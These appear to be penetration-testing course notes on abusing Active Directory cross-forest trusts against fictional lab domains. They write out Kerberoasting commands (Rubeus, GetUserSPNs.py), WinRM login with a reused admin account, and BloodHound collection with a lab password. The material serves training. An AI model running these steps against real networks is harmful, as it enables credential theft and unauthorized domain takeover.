--- ---

<h2>Attacking Domain Trusts - Cross-Forest Abuse (Windows)</h2>

1. Enumerate Accounts for Associated SPNs Using Get-DomainUser
```
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

2. Enumerate the mssqlsvc Account
```
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```

3. Perform Kerberoasting with Rubeus Using /domain Flag
```
PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL/user:mssqlsvc /nowrap
```
- We could then run the hash through Hashcat. If it cracks, we've now quickly expanded our access to fully control two domains by leveraging a pretty standard attack and abusing the authentication direction and setup of the bidirectional forest trust.



Admin Password Re-Use & Group Membership

We can use the PowerView function Get-DomainForeignGroupMember to enumerate groups with users that do not belong to the domain, also known as foreign group membership. Let's try this against the FREIGHTLOGISTICS.LOCAL domain with which we have an external bidirectional forest trust.

1. Use Get-DomainForeignGroupMember (PowerView)
![[Pasted image 20230105191023.png]]
The above command output shows that the built-in Administrators group in FREIGHTLOGISTICS.LOCAL has the built-in Administrator account for the INLANEFREIGHT.LOCAL domain as a member. We can verify this access using the Enter-PSSession cmdlet to connect over WinRM.

2. Access DC03 Using Enter-PSSession
```
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

From the command output above, we can see that we successfully authenticated to the Domain Controller in the FREIGHTLOGISTICS.LOCAL domain using the Administrator account from the INLANEFREIGHT.LOCAL domain across the bidirectional forest trust. This can be a quick win after taking control of a domain and is always worth checking for if a bidirectional forest trust situation is present during an assessment and the second forest is in-scope.



SID History Abuse - Cross Forest
![[Pasted image 20230105191151.png]]

---

<h2>Attacking Domain Trusts - Cross-Forest Abuse (Linux)</h2>

Cross-Forest Kerberoasting

1. Use GetUserSPNs.py
```
TeneBrae93@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
- -request flag added gives us the TGS ticket.
- Crack the hash with hashcat



Hunting Foreign Group Membership with Bloodhound-python

1. Add INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
![[Pasted image 20230105191332.png]]

2. Run bloodhound-python Against INLANEFREIGHT.LOCAL
```
TeneBrae93@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```

3. Compress the files with zip -r
```
TeneBrae93@htb[/htb]$ zip -r ilfreight_bh.zip *.json
```

4. Add freightlogistics.local to /etc/resolv.conf
![[Pasted image 20230105191426.png]]

5. Run bloodhound-python Against FREIGHTLOGISTICS.LOCAL
```
TeneBrae93@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA- DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```

- After uploading the second set of data (either each JSON file or as one zip file), we can click on Users with Foreign Domain Group Membership under the Analysis tab and select the source domain as INLANEFREIGHT.LOCAL
- We will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.

![[Pasted image 20230105191533.png]]